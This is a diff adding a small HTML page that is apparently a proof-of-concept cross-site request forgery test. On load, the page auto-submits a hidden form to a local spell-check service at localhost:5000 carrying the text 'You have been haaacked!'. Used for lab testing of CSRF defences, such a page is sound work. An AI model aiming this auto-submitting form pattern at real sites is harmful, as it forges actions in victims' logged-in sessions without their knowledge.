@@ -1,0 +1,7 @@
+<html>
+<body onload="document.CSRF.submit()">
+  <form action="http://localhost:5000/spell_check" method="POST" name="CSRF">
+    <input name="inputtext" type="hidden" value="You have been haaacked!">
+  </form>
+</body>
+</html>
